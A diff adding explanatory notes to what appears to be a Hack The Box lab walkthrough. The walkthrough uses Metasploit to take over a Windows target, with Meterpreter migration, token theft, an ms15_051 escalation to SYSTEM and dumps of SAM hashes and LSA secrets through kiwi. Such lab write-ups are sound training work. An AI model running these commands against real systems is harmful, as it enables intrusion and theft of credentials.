@@ -115,6 +115,7 @@ meterpreter > migrate <PID>
 # Or steal a token from a running process
 meterpreter > steal_token <PID>
 ```
+> `ps` lists all running processes. Find a stable, privileged process (like `svchost.exe` running as SYSTEM). Replace `<PID>` with the process ID from `ps` output. `steal_token` borrows a process token without fully migrating.
 
 > **Why migrate?** If the exploited process dies, your session dies. Migrating to a stable process (e.g., `svchost.exe`, `w3wp.exe`) ensures persistence.
 
@@ -132,6 +133,7 @@ msf6 exploit(...) > set LHOST tun0
 msf6 exploit(...) > run
 # Meterpreter session 1 opened
 ```
+> `-T5` sets aggressive nmap timing. `tun0` is the HTB VPN interface — use it for LHOST. Replace `10.10.10.15` with the target IP.
 
 ### 2. Initial Access — Token Theft
 
@@ -145,6 +147,7 @@ meterpreter > ps
 meterpreter > steal_token 1836
 # Stolen token with username: NT AUTHORITY\NETWORK SERVICE
 ```
+> If `getuid` is denied, your privileges are too low. Find a higher-privilege process in `ps` output and steal its token. Replace `1836` with the actual PID from your target.
 
 ### 3. Privilege Escalation — Local Exploit Suggester
 
@@ -155,6 +158,7 @@ msf6 post(...) > set SESSION 1
 msf6 post(...) > run
 # [+] exploit/windows/local/ms15_051_client_copy_image: vulnerable
 ```
+> Background the session first, then run the suggester. It scans the target through the active session and lists potential local privilege escalation exploits. Note the suggested module path — use it in the next step.
 
 ### 4. Escalate to SYSTEM
 
@@ -165,6 +169,7 @@ msf6 exploit(...) > set LHOST tun0
 msf6 exploit(...) > run
 # Meterpreter session 2 opened as NT AUTHORITY\SYSTEM
 ```
+> Local exploits require a SESSION option pointing to your existing Meterpreter session. The exploit runs inside the target through that session and opens a new, elevated session if successful.
 
 ### 5. Dump Credentials
 
@@ -178,6 +183,7 @@ meterpreter > lsa_dump_sam
 meterpreter > lsa_dump_secrets
 # LSA secrets — service account passwords, DPAPI keys
 ```
+> `hashdump` requires SYSTEM privileges and dumps the SAM database as NTLM hashes. `lsa_dump_sam` and `lsa_dump_secrets` are part of the `kiwi` extension — load it first with `load kiwi`.
 
 ---
 
